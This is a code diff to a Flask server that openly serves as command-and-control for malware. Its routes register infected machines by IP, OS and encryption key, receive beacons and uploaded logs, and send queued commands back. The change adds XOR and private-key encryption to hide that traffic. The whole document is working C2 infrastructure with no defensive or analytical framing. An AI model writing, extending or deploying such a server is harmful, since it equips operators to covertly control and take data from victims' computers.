@@ -1,6 +1,10 @@
 from flask import Flask, request
 import uuid
 import fileOps
+import encode
+import json
+
+
 
 app = Flask(__name__)
 
@@ -15,19 +19,34 @@ def get_log():
 
 @app.route("/upload", methods=['POST'])
 def connect():
-    fileOps.add_log(request.get_json())
+
+    json_payload = request.get_json()
+
+    key = fileOps.get_enc_key(json_payload["id"])
+
+    dec = encode.xor_decrypt(json_payload['data'], key)
+
+    data_json = json.loads(dec)
+
+    fileOps.add_log(data_json)
     return "this is a log"
 
 @app.route("/register", methods=['POST'])
 def registry():
 
     malwareRegistry = str(uuid.uuid1().int)
-    form_data = request.form.to_dict()
+
+    json_payload = request.get_json()
+
+    dec = encode.decrypt_message_priv(json_payload['data'])
+    
+    data_json = json.loads(dec)
 
     malware_entry = {
         "id": malwareRegistry,
         "ip": request.remote_addr,
-        "os_signature": form_data['OS']
+        "os_signature": data_json['OS'],
+        "key": data_json['key']
     }
     
     fileOps.add_malware(malware_entry)
@@ -35,12 +54,21 @@ def registry():
     return malwareRegistry
     
 
-@app.route("/becon")
+@app.route("/becon", methods=['POST'])
 def becon():
-    form_data = request.form.to_dict()
 
-    fileOps.update_becon(form_data["id"],form_data["timestamp"])
-    return "you are now beconning"
+    json_payload = request.get_json()
+
+    key = fileOps.get_enc_key(json_payload["id"])
+
+    dec = encode.xor_decrypt(json_payload['data'], key)
+
+    data_json = json.loads(dec)
+          
+    print(data_json)
+
+    fileOps.update_becon(data_json["id"], data_json["timestamp"])
+    return ""
 
 @app.route("/command", methods=['POST', 'GET'])
 def command():
@@ -48,12 +76,20 @@ def command():
         form_data = request.form.to_dict()
 
         cmd = fileOps.get_command(form_data["id"])
-        print(cmd)
+
 
         if not cmd:
             return "none"
         else:
-            return cmd[0]
+
+            json_payload = {
+            "cmd": cmd[0]
+            }
+
+            key = fileOps.get_enc_key(form_data["id"])
+            enc_json = encode.xor_encrypt(json.dumps(json_payload) , key)
+
+            return enc_json
     else:
         fileOps.post_command(request.get_json())
 
@@ -62,3 +98,4 @@ def command():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
